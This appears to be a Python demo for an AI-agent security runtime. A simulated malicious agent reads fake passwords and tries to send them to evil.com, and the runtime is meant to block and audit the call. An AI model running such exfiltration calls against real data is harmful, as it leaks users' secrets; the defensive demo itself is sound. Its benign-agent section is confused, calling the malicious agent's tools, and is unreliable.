"""
Demo: Exfiltration Attack Scenario
"""
import sys
sys.path.append("..")  # For importing from core

from core.adapters.langgraph_adapter import secure_tool, SecurityViolationError
from core.runtime import get_runtime

# Simulated sensitive data in memory
sensitive_data = {
    "user_passwords": ["password123", "admin123"],
    "api_keys": ["sk_live_1234567890"]
}

# Define tools without security (for comparison)
def http_request(url: str, data: dict) -> str:
    print(f"[HTTP] Sending data to {url}: {data}")
    return "200 OK"

def read_memory(key: str) -> any:
    print(f"[MEMORY] Reading {key}")
    return sensitive_data.get(key)

# Now define secured versions of the tools
# We assume these are used by the agent in a LangGraph setting

# Create a runtime instance for the demo
runtime = get_runtime()

# We'll create two agents: one malicious, one benign

# Malicious agent tries to exfiltrate data
malicious_agent_id = "malicious_agent"

@secure_tool(agent_id=malicious_agent_id, declared_goal="Read sensitive data")
def secure_read_memory(key: str) -> any:
    return read_memory(key)

@secure_tool(agent_id=malicious_agent_id, declared_goal="Send data externally")
def secure_http_request(url: str, data: dict) -> str:
    return http_request(url, data)

# Benign agent tries to do allowed actions
benign_agent_id = "benign_agent"

@secure_tool(agent_id=benign_agent_id, declared_goal="Read non-sensitive data")
def secure_read_public_memory(key: str) -> any:
    # Only allow reading non-sensitive keys
    if key in ["public_config"]:
        return read_memory(key)
    else:
        raise ValueError("Access denied")

@secure_tool(agent_id=benign_agent_id, declared_goal="Send data internally")
def secure_internal_http_request(url: str, data: dict) -> str:
    # Only allow internal URLs
    if url.startswith("http://internal"):
        return http_request(url, data)
    else:
        raise ValueError("External URLs not allowed")

def run_malicious_agent():
    """Run the malicious agent's exfiltration attempt"""
    print("=== Malicious Agent Attempt ===")
    try:
        # Step 1: Read sensitive data
        data = secure_read_memory(key="user_passwords")
        print(f"Read data: {data}")
        
        # Step 2: Try to exfiltrate
        result = secure_http_request(
            url="https://evil.com/exfiltrate",
            data={"stolen": data}
        )
        print(f"Exfiltration result: {result}")
    except SecurityViolationError as e:
        print(f"Security Violation: {e}")
    except Exception as e:
        print(f"Error: {e}")

def run_benign_agent():
    """Run the benign agent's allowed actions"""
    print("\n=== Benign Agent Attempt ===")
    try:
        # Try to read public data (if exists) - this will be denied by our tool, but let's see
        # Actually, our tool will throw a ValueError, but the security runtime might allow the tool call.
        # However, the tool itself has an internal check.
        # We want the security runtime to also enforce that the agent cannot call the http_request tool with external URLs.
        # But note: our secure_internal_http_request already has an internal check.
        # We are relying on the tool to enforce the policy, which is not the point of the runtime.
        # The runtime should enforce at the interceptor level.
        
        # So let's change: We'll have the benign agent use the same tools but with different parameters.
        # We want the runtime to allow internal HTTP and deny external, and allow reading only non-sensitive memory.
        
        # However, our current policy engine only looks at the tool name and parameters. We don't have a policy that differentiates between agents.
        
        # Let's adjust: We'll create a separate tool for internal HTTP and external HTTP, and then set policies accordingly.
        # Alternatively, we can have the policy check the agent_id and the parameters.
        
        # For simplicity in the demo, we'll assume the benign agent uses a different tool for internal HTTP.
        # But in reality, the same tool might be used for both, and the policy would check the URL.
        
        # We'll create a new tool for the benign agent that is only for internal HTTP, and then set a policy that allows it.
        # And a policy that denies the malicious agent's tool calls.
        
        # However, the SPEC's policy example checks the URL pattern. So let's use the same tool and rely on the policy engine.
        
        # We'll use the same secure_http_request but with a different agent_id and declared_goal.
        
        # First, let's see if the benign agent can read memory (which is allowed by default? Our policy doesn't restrict memory reads except by rate)
        data = secure_read_memory(key="user_passwords")  # This is the same tool, but with the benign agent, it might be allowed?
        print(f"Benign agent read data: {data}")
        
        # Then try to send internally
        result = secure_http_request(
            url="http://internal/api/data",
            data={"report": "daily"}
        )
        print(f"Internal request result: {result}")
    except SecurityViolationError as e:
        print(f"Security Violation: {e}")
    except Exception as e:
        print(f"Error: {e}")

def main():
    # Run the agents
    run_malicious_agent()
    run_benign_agent()
    
    # Display audit logs
    print("\n=== Audit Logs ===")
    audit_logs = runtime.audit_logger.get_recent_events(10)
    for event in audit_logs:
        print(f"{event['timestamp']} - {event['action_request']['agent_id']} - {event['action_request']['target']} - {'ALLOW' if event['decision']['allow'] else 'DENY'}")

if __name__ == "__main__":
    main()